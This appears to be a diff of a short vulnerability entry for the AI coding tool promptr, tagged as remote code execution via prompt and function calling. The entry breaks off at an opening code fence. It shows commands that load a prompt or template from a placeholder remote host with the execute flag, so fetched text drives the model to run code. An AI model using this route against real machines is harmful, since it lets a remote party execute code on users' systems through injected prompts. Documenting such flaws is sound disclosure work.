@@ -1,10 +1,13 @@
 version: 6.0.7
 
-tag: RCE, Prompt, FunctionCalling
+url: https://github.com/ferrislucas/promptr  
+tag: RCE, Prompt, FunctionCalling  
 
+cmd:  
 promptr -m gpt4 -p "http://IP/prompt.txt" -x  
 promptr -m gpt4 -t "http://IP/template.txt" -p "apple" -x
 
+analysis:  
 promptr can load prompt/template file from the url
 
 ```javascript
